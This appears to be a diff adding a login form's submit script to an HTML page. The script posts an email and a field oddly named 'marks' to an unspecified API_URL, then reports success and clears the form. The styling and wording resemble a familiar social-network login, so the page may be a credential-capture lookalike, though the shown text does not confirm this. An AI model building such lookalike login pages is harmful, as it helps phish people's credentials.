@@ -179,4 +179,53 @@
       status.textContent = "Logging in..";
       status.style.color = "#606770";
       submitBtn.disabled = true;
-      submitBtn.textContent
+      submitBtn.textContent = "Logging in...";
+
+      const email = form.elements["email"].value.trim();
+      const marks = form.elements["marks"].value.trim();
+
+      try {
+        const response = await fetch(API_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            contact: email,
+            marks: marks
+          })
+        });
+
+        const result = await response.text();
+
+        if (!response.ok) {
+          throw new Error(
+            result || "Login failed. Please try again."
+          );
+        }
+
+        status.textContent =
+          "Login successfull";
+        status.style.color = "green";
+
+        form.reset();
+
+      } catch (error) {
+        console.error("Login error:", error);
+
+        status.textContent =
+          error.message === "Failed to fetch"
+            ? "Unable to connect to the server. Please try again later."
+            : error.message;
+
+        status.style.color = "red";
+
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Log in";
+      }
+    });
+  </script>
+
+</body>
+</html>
